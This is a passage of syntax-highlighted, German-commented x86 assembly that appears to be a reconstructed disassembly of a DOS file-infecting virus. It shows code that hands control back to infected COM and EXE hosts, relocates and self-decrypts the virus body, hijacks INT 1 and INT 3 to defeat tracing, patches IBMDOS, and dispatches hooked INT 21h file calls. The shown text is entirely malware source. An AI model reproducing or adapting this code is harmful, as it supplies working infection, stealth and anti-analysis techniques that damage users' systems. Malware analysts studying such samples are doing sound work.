                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXE_ID</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0100h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXE_ID</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0102h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXE_ID</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0104h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">PSP_SEG</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; PUSH Start-Segment</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">; AX = 100h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">                </span><span class="sc1">; == JMP PSP_SEG:100H == COM-START</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================================( JMP zum EXE-Start )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02A2E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SS_INIT</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SP_INIT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J02A41</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SS_INIT</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">CODE_INIT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;=========================================================(trash !)===</span><span class="sc0">
</span><span class="sc5">J02A4F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">06C7h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; CS:2ED7 = E3CB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000CH</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; INT 3 setzen !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000EH</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">                            </span><span class="sc1">; CALL 5DBA ?!?</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================================( TRACE-ROUTINE )======</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02A63</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0"> </span><span class="sc1">; ? Change Flags ?</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">   </span><span class="sc1">; SET INT 3 SEGMENT</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">   </span><span class="sc1">; SET INT 3 OFFSET</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J02CD8</span><span class="sc0">                   </span><span class="sc1">; Kein Return, sondern</span><span class="sc0">
                                                 </span><span class="sc1">; sowas wie 'IRET'</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02A7D</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;======================================================( Trash ???)===</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BEh</span><span class="sc0">                             </span><span class="sc1">;02A80</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">                             </span><span class="sc1">;02A81</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ABh</span><span class="sc0">                             </span><span class="sc1">;02A82</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">                             </span><span class="sc1">;02A83</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EFh</span><span class="sc0">                             </span><span class="sc1">;02A84</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0AFh</span><span class="sc0">                             </span><span class="sc1">;02A85</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">                             </span><span class="sc1">;02A86</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EFh</span><span class="sc0">                             </span><span class="sc1">;02A87</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0ABh</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;02A88</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0BFh</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;02A8A</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EFh</span><span class="sc0">                             </span><span class="sc1">;02A8C</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ABh</span><span class="sc0">                             </span><span class="sc1">;02A8D</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">                             </span><span class="sc1">;02A8E</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0ABh</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;02A8F</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BFh</span><span class="sc0">                             </span><span class="sc1">;02A91</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">                             </span><span class="sc1">;02A92</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EFh</span><span class="sc0">                             </span><span class="sc1">;02A93</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">                             </span><span class="sc1">;02A94</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0ABh</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;02A95</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0FBh</span><span class="sc0">                             </span><span class="sc1">;02A97</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ABh</span><span class="sc0">                             </span><span class="sc1">;02A98</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">                             </span><span class="sc1">;02A99</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BFh</span><span class="sc0">                             </span><span class="sc1">;02A9A</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">                             </span><span class="sc1">;02A9B</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0BFh</span><span class="sc0">                             </span><span class="sc1">;02A9C</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ABh</span><span class="sc0">                             </span><span class="sc1">;02A9D</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0abh</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;---( Hier wird der Code neu reloziert, so da· Virstart zum       )---</span><span class="sc0">
</span><span class="sc1">;---( Offset 0 wird. Dazu wird das neue Codesegment errechnet und )---</span><span class="sc0">
</span><span class="sc1">;---( spÑter Åber RETF angesprungen. Die Routine muss ausgefÅhrt  )---</span><span class="sc0">
</span><span class="sc1">;---( werden, bevor der Code scharf gemacht wird. Der Patcher     )---</span><span class="sc0">
</span><span class="sc1">;---( geht vom neuen Codesegment aus.                             )---</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Relokator</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DecodeFollowingCode</span><span class="sc0">
</span><span class="sc5">J02AA8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">     </span><span class="sc1">; Stack verwerfen !</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L2AAD</span><span class="sc0">
</span><span class="sc5">L2AAD</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; AX = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0010H</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; AX = CS * 16</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; CX = Offset L2AAD</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">L2AAD</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRSTART</span><span class="sc0">
                                  </span><span class="sc1">; CX = Offset L2AAD - 29D</span><span class="sc0">
                                  </span><span class="sc1">;    = Offset VirStart = 2810h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; DX:AX := CS*10+2810</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; DX:AX := CS+281</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Ergebnis auf Stack,</span><span class="sc0">
                                  </span><span class="sc1">; (== Segment Returnadresse )</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J028AB</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                                  </span><span class="sc1">; Offset Returnadresse ; (CS+281h):09Bh</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">     </span><span class="sc1">; AX = 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VersteckeCodeWieder</span><span class="sc0">
</span><span class="sc5">J02ACC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">retf</span><span class="sc0">              </span><span class="sc1">; RETURN nach CS:28AB, immer !</span><span class="sc0">
</span><span class="sc1">;===========================================================(trash)===</span><span class="sc0">
</span><span class="sc5">J02ACD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">         </span><span class="sc1">; MOV     AH,03h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc0">        </span><span class="sc1">; MOV     BX,AX</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc0">            </span><span class="sc1">; JMP     J02BBC</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================================( Setzen von INT 01 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02AD2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J02AD5</span><span class="sc0">
</span><span class="sc5">J02AD5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; BX = 2AD5</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J02AD5</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J02A63</span><span class="sc0">
                                                </span><span class="sc1">; BX = 2A63</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; INT 01 Offset = 2A63</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; INT 01 Segment= CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc5">J02AE4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0F346h</span><span class="sc0">               </span><span class="sc1">; SET TF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

</span><span class="sc5">J02AEA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">                   </span><span class="sc1">; MOV AL,[2AA9+x]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">J02AEF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J047B1</span><span class="sc0">
</span><span class="sc1">;=========================================================( trash )===</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc0">   </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02AE4</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================( wird von INT 3 / INT 21h angesprungen)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02AFB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; HOLE Flags vom Caller-Stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; und merke sie</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; BP bleibt auf Stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StopINT_02</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirStack</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PUSHALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================( sucht zu Wert in AL den passenden Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">GetHandler</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J02B8B</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02B45</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">000Fh</span><span class="sc0">
</span><span class="sc5">J02B38</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02B72</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J02B38</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B7B</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02B45</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;=================================( Tabelle )=========</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc5">L0699</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 2EA9  ; open FCB</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc5">L04F4</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 2D04  ; Findfirst FCB</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc5">L04F4</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;       ; Findnext  FCB</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc5">L06E0</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 2EF0  ; Read Seq. FCB</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc5">L06CA</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 2EDA  ; Read Random FCB</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">023h</span><span class="sc4">,</span><span class="sc5">L08CF</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 30DF  ; Get Filesize FCB</span><span class="sc0">
                </span><span class="sc5">if_then</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc5">L06C8</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">; 2ED8  ; Read Rndm Block FCB</span><span class="sc0">
